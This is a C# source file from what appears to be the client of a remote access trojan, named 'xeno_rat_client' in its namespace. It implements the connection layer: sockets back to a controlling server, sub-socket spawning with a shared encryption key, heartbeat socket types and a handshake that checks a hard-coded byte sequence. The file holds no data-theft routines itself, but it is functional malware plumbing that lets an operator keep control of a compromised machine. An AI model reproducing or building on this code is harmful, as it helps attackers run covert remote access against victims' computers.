using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace xeno_rat_client
{
    public class Node
    {

        /// <summary>
        /// Compares a specified number of bytes in two byte arrays.
        /// </summary>
        /// <param name="b1">The first byte array to compare.</param>
        /// <param name="b2">The second byte array to compare.</param>
        /// <param name="count">The number of bytes to compare.</param>
        /// <returns>
        /// A signed integer that indicates the relative order of the byte arrays.
        /// </returns>
        /// <exception cref="System.AccessViolationException">
        /// The method was unable to perform the comparison due to an access violation.
        /// </exception>
        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        private static extern int memcmp(byte[] b1, byte[] b2, long count);
        
        private Action<Node> OnDisconnect;
        public List<Node> subNodes = new List<Node>();
        public SocketHandler sock;
        public Node Parent;
        public int ID = -1;
        public int SetId = -1;
        public int SockType = -1;
        public Node(SocketHandler _sock, Action<Node> _OnDisconnect)
        {
            sock = _sock;
            OnDisconnect = _OnDisconnect;
        }

        /// <summary>
        /// Adds a sub-node to the current node.
        /// </summary>
        /// <param name="subNode">The sub-node to be added to the current node.</param>
        /// <remarks>
        /// This method adds the specified sub-node to the list of sub-nodes associated with the current node.
        /// </remarks>
        public void AddSubNode(Node subNode) 
        {
            subNodes.Add(subNode);
        }

        /// <summary>
        /// Disconnects the socket and clears the sub-nodes list, and invokes the OnDisconnect event if subscribed.
        /// </summary>
        /// <remarks>
        /// This method disconnects the socket asynchronously using the BeginDisconnect and EndDisconnect methods of the <paramref name="sock"/> object.
        /// It then disposes the socket and clears the sub-nodes list by iterating through a copy of the list and disconnecting each node.
        /// Finally, it invokes the OnDisconnect event if it is subscribed.
        /// </remarks>
        public async void Disconnect()
        {
            try
            {
                if (sock.sock != null)
                {
                    await Task.Factory.FromAsync(sock.sock.BeginDisconnect, sock.sock.EndDisconnect, true, null);
                }
            }
            catch
            {
                sock.sock?.Close(0);
            }
            sock.sock?.Dispose();
            List<Node> copy = subNodes.ToList();
            subNodes.Clear();
            foreach (Node i in copy)
            {
                i?.Disconnect();
            }
            copy.Clear();
            if (OnDisconnect != null)
            {
                OnDisconnect(this);
            }
        }

        /// <summary>
        /// Asynchronously connects a sub socket and sets up the connection with the specified parameters.
        /// </summary>
        /// <param name="type">The type of the socket connection.</param>
        /// <param name="retid">The return ID for the connection.</param>
        /// <param name="OnDisconnect">An optional action to be performed on disconnection.</param>
        /// <returns>A <see cref="Task{Node}"/> representing the asynchronous operation. The connected sub socket.</returns>
        /// <remarks>
        /// This method creates a new socket with the specified address family, socket type, and protocol type.
        /// It then asynchronously connects the socket to the remote endpoint.
        /// After successful connection, it sets up the connection using the specified encryption key, type, and ID, and performs an optional action on disconnection.
        /// It then sends the return ID to the connected sub socket and returns the sub socket.
        /// If an exception occurs during the process, it sends a byte indicating failure and returns null.
        /// </remarks>
        public async Task<Node> ConnectSubSockAsync(int type, int retid, Action<Node> OnDisconnect = null)
        {
            try
            {
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                await socket.ConnectAsync(sock.sock.RemoteEndPoint);

                Node sub = await Utils.ConnectAndSetupAsync(socket, sock.EncryptionKey, type, ID, OnDisconnect);
                byte[] byteRetid = new byte[] { (byte)retid };
                await sub.SendAsync(byteRetid);
                byte[] worked = new byte[] { 1 };
                await SendAsync(worked);
                return sub;
            }
            catch
            {
                byte[] worked = new byte[] { 0 };
                await SendAsync(worked);
                return null;
            }
        }

        /// <summary>
        /// Checks if the socket is connected and returns a boolean value indicating the connection status.
        /// </summary>
        /// <returns>True if the socket is connected; otherwise, false.</returns>
        /// <remarks>
        /// This method checks the connection status of the socket and returns a boolean value indicating whether the socket is connected or not.
        /// If an exception occurs during the check, the method returns false.
        /// </remarks>
        public bool Connected() 
        {
            try
            {
                return sock.sock.Connected;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// Asynchronously receives data from the socket and returns the received data as a byte array.
        /// </summary>
        /// <returns>The received data as a byte array. Returns null if no data is received, in which case the method also disconnects from the socket.</returns>
        /// <exception cref="Exception">Thrown when there is an issue with receiving data from the socket.</exception>
        public async Task<byte[]> ReceiveAsync()
        {
            byte[] data = await sock.ReceiveAsync();
            if (data == null)
            {
                Disconnect();
                return null;
            }
            return data;
        }

        /// <summary>
        /// Sends the specified data asynchronously and returns a boolean indicating the success of the operation.
        /// </summary>
        /// <param name="data">The byte array to be sent.</param>
        /// <returns>True if the data is sent successfully; otherwise, false.</returns>
        /// <exception cref="Exception">Thrown when the sending operation fails.</exception>
        public async Task<bool> SendAsync(byte[] data)
        {
            if (!(await sock.SendAsync(data)))
            {
                Disconnect();
                return false;
            }
            return true;
        }

        /// <summary>
        /// Compares two byte arrays and returns true if they are equal; otherwise, false.
        /// </summary>
        /// <param name="b1">The first byte array to be compared.</param>
        /// <param name="b2">The second byte array to be compared.</param>
        /// <returns>True if the byte arrays are equal; otherwise, false.</returns>
        /// <remarks>
        /// This method compares the lengths of the input byte arrays <paramref name="b1"/> and <paramref name="b2"/>.
        /// If the lengths are not equal, the method returns false.
        /// If the lengths are equal, the method uses the memcmp function to compare the contents of the byte arrays.
        /// The memcmp function returns 0 if the contents are equal, and a non-zero value if they are not equal.
        /// </remarks>
        private bool ByteArrayCompare(byte[] b1, byte[] b2)
        {
            return b1.Length == b2.Length && memcmp(b1, b2, b1.Length) == 0;
        }

        /// <summary>
        /// Sets the receive timeout for the socket.
        /// </summary>
        /// <param name="ms">The receive timeout value in milliseconds.</param>
        /// <remarks>
        /// This method sets the receive timeout for the underlying socket to the specified value in milliseconds.
        /// </remarks>
        public void SetRecvTimeout(int ms) 
        {
            sock.SetRecvTimeout(ms);
        }

        /// <summary>
        /// Resets the receive timeout for the socket.
        /// </summary>
        /// <remarks>
        /// This method resets the receive timeout for the underlying socket to the default value.
        /// </remarks>
        public void ResetRecvTimeout()
        {
            sock.ResetRecvTimeout();
        }

        /// <summary>
        /// Authenticates the connection based on the specified type and optional ID.
        /// </summary>
        /// <param name="type">The type of authentication (0 = main, 1 = heartbeat, 2 = anything else).</param>
        /// <param name="id">The optional ID for authentication (default is 0).</param>
        /// <returns>A boolean value indicating whether the authentication was successful.</returns>
        /// <remarks>
        /// This method authenticates the connection based on the specified type and optional ID. It sends and receives data over the socket and performs necessary checks to ensure successful authentication.
        /// If the authentication is successful, it returns true; otherwise, it returns false.
        /// </remarks>
        public async Task<bool> AuthenticateAsync(int type, int id = 0)//0 = main, 1 = heartbeat, 2 = anything else
        {
            byte[] data;
            byte[] comp = new byte[] { 109, 111, 111, 109, 56, 50, 53 };
            try
            {
                sock.SetRecvTimeout(5000);
                data = await sock.ReceiveAsync();
                if (!await sock.SendAsync(data))
                {
                    return false;
                }
                data = await sock.ReceiveAsync();
                sock.ResetRecvTimeout();
                if (ByteArrayCompare(comp, data))
                {
                    byte[] _SockType = sock.IntToBytes(type);
                    if (!(await sock.SendAsync(_SockType)))
                    {
                        return false;
                    }
                    if (type == 0)
                    {
                        data = await sock.ReceiveAsync();
                        int connId = sock.BytesToInt(data);
                        ID = connId;
                    }
                    else
                    {
                        ID = id;
                        byte[] connId = sock.IntToBytes(id);
                        if (!(await sock.SendAsync(connId)))
                        {
                            return false;
                        }
                    }
                    SockType = type;
                    return true;
                }
            }
            catch
            {

            }
            return false;
        }
    }
}
